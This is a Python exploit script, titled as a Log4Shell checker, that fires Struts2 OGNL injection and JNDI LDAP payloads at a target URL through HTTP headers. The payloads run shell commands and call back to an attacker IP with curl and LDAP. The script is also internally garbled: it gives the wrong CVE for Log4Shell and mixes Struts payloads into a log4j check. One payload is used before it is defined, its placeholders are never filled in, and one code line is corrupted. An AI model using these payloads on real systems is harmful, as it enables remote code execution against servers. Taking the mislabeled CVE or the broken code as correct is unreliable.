# Check-Log4Shell
# Author: cbk914
import argparse
import requests
import re
from urllib.parse import urlparse

# Set up the command-line argument parser
parser = argparse.ArgumentParser(description="Check for log4j RCE vulnerability (CVE-2017-5645)")
parser.add_argument("-t", "--target", required=True, help="Target URL")
parser.add_argument("-i", "--attackerIP", required=True, help="Attacker IP")
parser.add_argument("-p", "--attackerPort", required=True, help="Attacker Port")
parser.add_argument("-x", "--proxy", default="127.0.0.1:8080", help="Proxy server (default: 127.0.0.1:8080)")

# Parse the command-line arguments
args = parser.parse_args()

# Sanitize the input
url = urlparse(args.target)
if url.scheme not in ['http', 'https']:
    parser.error("Invalid target format. Only URLs with http or https scheme are allowed")
if not re.match(r"^[a-zA-Z0-9-.]+$", url.hostname):
    parser.error("Invalid target format. Only URLs with valid hostname are allowed")
if url.hostname in ['localhost', '127.0.0.1']:
    parser.error("Invalid target format. Localhost or internal IP addresses are not allowed")

# Sanitize attacker IP
if not re.match(r"^([0-9]{1,3}\.){3}[0-9]{1,3}$", args.attackerIP):
    parser.error("Invalid IP format. Please enter a valid IP address.")
    
# Sanitize attacker port
if not re.match(r"^[0-9]+$", args.attackerPort):
    parser.error("Invalid port format. Please enter a valid port number.")

# Construct the payloads
payloads = []
# Payload 0
payload0 = "%{(#_='multipart/form-data')."
payload0 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload0 += "(#_memberAccess?"
payload0 += "(#_memberAccess=#dm):"
payload0 += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload0 += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload0 += "(#ognlUtil.getExcludedPackageNames().clear())."
payload0 += "(#ognlUtil.getExcludedClasses().clear())."
payload0 += "(#context.setMemberAccess(#dm))))."
payload0 += "(#cmd='id')."
payload0 += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))."
payload0 += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
payload0 += "(#p=new java.lang.ProcessBuilder(#cmds))."
payload0 += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload0 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload0 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload0 += "(#ros.flush())}"
payload0 += "${(#[new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream()).useDelimiter(\"\\\\A\").next(),throw new java.lang.Exception(\"byPass\"))]}"
payload0 += "${jndi:ldap://%s:%s/Basic/Object}" % (args.attackerIP, args.attackerPort)
payload0 += "${ldap://%s:%s/Basic/Object}" % (args.attackerIP, args.attackerPort)

payloads.append(payload0)

# Payload 1 (continued)
payload1 += "/Object}."
payload1 += "jsp"
payload1 += "?"
payload1 += "x=@java.lang.Runtime@getRuntime().exec('curl http://{attackerIP}:{attackerPort}/success').getInputStream()"
payload1 += "}"
payload1 += "%7d"

payloads.append(payload1)

# Payload 2
payload2 = "${"
payload2 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload2 += "(#q['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('log4j2.debug','cmd:{}')).".format('curl http://{attackerIP}:{attackerPort}/success')
payload2 += "(#q['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().println(''))."
payload2 += "(#q['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().flush())"
payload2 += "}"
payloads.append(payload2)

# Payload 3
payload3 = "${"
payload3 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload3 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload3 += "(#_memberAccess['excludedClasses']='')."
payload3 += "(#_memberAccess['excludedPackageName']='')."
payload3 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload3 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload3 += "(#p=new java.lang.ProcessBuilder({'bash','-c','curl http://{attackerIP}:{attackerPort}/success'}))."
payload3 += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload3 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload3 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload3 += "(#ros.flush())"
payload3 += "}"
payloads.append(payload3)

# Payload 4
payload4 = "${"
payload4 += "(#context[#parameters.rps[0]].getWriter().println(''))."
payload4 += "(#context[#parameters.rps[0]].getWriter().flush())."
payload4 += "(#[email protected]@('/var/www/html/test.txt',new java.net.URL('http://{attackerIP}:{attackerPort}/exploit')))."
payload4 += "}"
payloads.append(payload4)

# Payload 5
payload5 = "${"
payload5 += "(#_memberAccess['allowStaticMethodAccess']=true)."
payload5 += "(#_memberAccess['excludedClasses']='')."
payload5 += "(#_memberAccess['excludedPackageName']='')."
payload5 += "(#p=new java.lang.ProcessBuilder({'bash','-c','curl http://{attackerIP}:{attackerPort}/success'}))."
payload5 += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload5 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload5 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload5 += "(#ros.flush())"
payload5 += "}"
payloads.append(payload5)

# Iterate through the payloads and send requests to the target website
for i, payload in enumerate(payloads):
    headers = {"Content-Type": payload}

    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
        response = requests.post(args.target, headers=headers, proxies=proxies)
    else:
        response = requests.post(args.target, headers=headers)

    # Check the response for the payload
    if response.status_code == 200 and "uid=" in response.text:
        print(f"Payload {i+1} executed successfully.")
    else:
        print(f"Payload {i+1} failed to execute.")

for i, payload in enumerate(payloads):
    headers = {"User-Agent": payload}
    try:
        response = requests.get(args.target, headers=headers, proxies=proxies, timeout=5)
        if response.status_code == 200 and "log4j2.debug" in response.headers:
            print(f"Payload {i+1} executed successfully.")
        else:
            print(f"Payload {i+1} failed to execute.")
    except:
        print(f"Payload {i+1} failed to execute.")        
        
# Check the response for the payload
if "uid=" in response.text:
    print("Target is vulnerable to log4j RCE (CVE-2017-5645).")
else:
    print("Target is not vulnerable to log4j RCE (CVE-2017-5645).")
